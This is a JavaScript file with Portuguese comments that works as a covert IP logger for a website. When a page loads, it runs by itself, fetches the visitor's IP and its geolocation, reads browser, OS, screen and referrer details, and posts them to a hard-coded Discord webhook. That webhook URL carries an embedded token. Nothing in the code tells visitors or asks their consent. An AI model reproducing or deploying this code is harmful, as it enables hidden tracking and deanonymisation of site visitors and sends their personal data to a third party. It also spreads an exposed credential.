// script.js

async function sendLogs(data) {
    const webhookURL = 'https://discord.com/api/webhooks/1295230397340454943/lKKzKfw-HU6pS9BUTdPTA8po8Ih8f53lkNleiBK0e9QryyUBzYaxD76LX3Ra73ddjSmd'; // Substitua pela sua URL do webhook

    const body = {
        content: `**Um Novo Usuário Entrou no WebSite!** 🎉\n\n` +
                 `🌐 **IP** | **${data.ip}**\n\n` +
                 `🏠 **Cidade** | **${data.city}**\n` +
                 `🗺️ **Região** | **${data.region}**\n` +
                 `🌍 **País** | **${data.country}**\n\n` +
                 `📌 **Localização** | **${data.loc}**\n` +
                 `🕒 **Horário** | **${data.timezone}**\n\n` +
                 `**Informações do Navegador:**\n` +
                 `🖥️ **Navegador** | **${data.browser}**\n` +
                 `💻 **Sistema Operacional** | **${data.os}**\n` +
                 `📏 **Tamanho da Tela** | **${data.screenWidth}x${data.screenHeight}**\n` +
                 `🔗 **URL de Referência** | **${data.referrer || 'N/A'}**\n` +
                 `📅 **Data e Hora** | **${new Date().toLocaleString()}** ⏰\n` +
                 `\n**Obrigado por visitar!** 🙌`
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body),
        });

        if (!response.ok) {
            throw new Error('Erro ao enviar os logs: ' + response.statusText);
        }
    } catch (error) {
        console.error('Falha ao enviar logs para o Discord:', error);
    }
}

async function collectInfo() {
    // Coletando informações
    const userAgent = navigator.userAgent;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const referrer = document.referrer;

    // Função para determinar o navegador e sistema operacional
    function getBrowserInfo(ua) {
        let browser = 'Desconhecido';
        let os = 'Desconhecido';

        // Identificação do navegador
        if (ua.indexOf('Firefox') > -1) {
            browser = 'Mozilla Firefox';
        } else if (ua.indexOf('Chrome') > -1) {
            browser = 'Google Chrome';
        } else if (ua.indexOf('Safari') > -1) {
            browser = 'Safari';
        } else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) {
            browser = 'Internet Explorer';
        } else if (ua.indexOf('Edge') > -1) {
            browser = 'Microsoft Edge';
        }

        // Identificação do sistema operacional
        if (ua.indexOf('Win') > -1) {
            os = 'Windows';
        } else if (ua.indexOf('Mac') > -1) {
            os = 'MacOS';
        } else if (ua.indexOf('X11') > -1 || ua.indexOf('Linux') > -1) {
            os = 'Linux';
        } else if (ua.indexOf('Android') > -1) {
            os = 'Android';
        } else if (ua.indexOf('like Mac') > -1) {
            os = 'iOS';
        }

        return { browser, os };
    }

    // Obtendo o IP do usuário e localização
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();

        // Obtendo a localização com base no IP
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();

        // Obtendo informações do navegador e sistema operacional
        const { browser, os } = getBrowserInfo(userAgent);

        const userInfo = {
            ip: ipData.ip,
            city: locationData.city || 'N/A',
            region: locationData.region || 'N/A',
            country: locationData.country_name || 'N/A',
            loc: locationData.loc || 'N/A',
            timezone: locationData.timezone || 'N/A',
            userAgent: userAgent,
            screenWidth: screenWidth,
            screenHeight: screenHeight,
            referrer: referrer,
            browser: browser,
            os: os
        };

        // Enviar as informações para o Discord
        sendLogs(userInfo);
    } catch (error) {
        console.error('Falha ao obter informações do usuário:', error);
    }
}

// Executar a coleta de informações
collectInfo();
